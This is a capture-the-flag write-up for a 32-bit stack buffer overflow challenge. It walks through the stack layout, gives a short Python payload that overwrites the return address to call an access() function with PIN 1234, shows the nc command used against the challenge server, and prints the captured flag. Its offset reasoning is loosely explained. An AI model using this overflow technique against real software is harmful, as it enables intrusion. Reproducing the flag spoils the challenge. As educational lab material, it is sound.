# Queen Anne's Revenge
> Aye, lad, can ye outsmart the wicked Blackbeard? if ye can, ye'll be the richest lad in all of Nassau!!!!!

Author: adieos


## About the Challenge
This challenge gives a main.c and chall elf

## How to Solve?

First, let's read main.c to understand what this code actually does to get the flag. Here, I see that to get the flag, the user must log in as blackbeard and set the PIN to 1234. Meanwhile, the default PIN is set to 123 and the user is not prompted for a PIN. So, I believe this is a buffer overflow challenge.

Then, I disassembled the elf challenge to understand what it actually does. From the C source and disassembly:
```
access_addr = 0x080491e6 # access() function address
piratename: 15 bytes
pin: 4 bytes
saved ebp: 4 bytes
return addr: 4 bytes <- this is what we overwrite
```
So, to reach the return address, the number of bytes to be written is: 15 (piratename) + 4 (pin) + 4 (saved ebp) = 23 bytes to overwrite up to before the return addr, then overwrite the return addr (4 bytes) starting at offset 24. In our exploit we use 27 bytes of padding because it reaches the correct return address location in this environment. untuk melakukannya, saya membuat file exploit seperti ini

```
import struct
access_addr = 0x080491e6
payload = b'A' * 27
payload += struct.pack('<I', access_addr)
payload += b'BBBB'
payload += struct.pack('<I', 1234)
payload += b'\n123\n'
import sys
sys.stdout.buffer.write(payload)

```
then we just run it with the command
```
python3 exploit.py | nc intersec.hcs-team.com 10131
```

<img width="786" height="533" alt="Screenshot from 2025-09-17 20-13-58" src="https://github.com/user-attachments/assets/67084251-59e1-45dd-a2a7-8ad9de7d21c0" />


Boom. we got the flag



## Flag
```
HCS{y4rrrr_ill_se3_y3_in_d4vy_j0n35_l0ck3r_4ye_7ec89d5f-2584-45c0-929b-37b30be33c40}
```
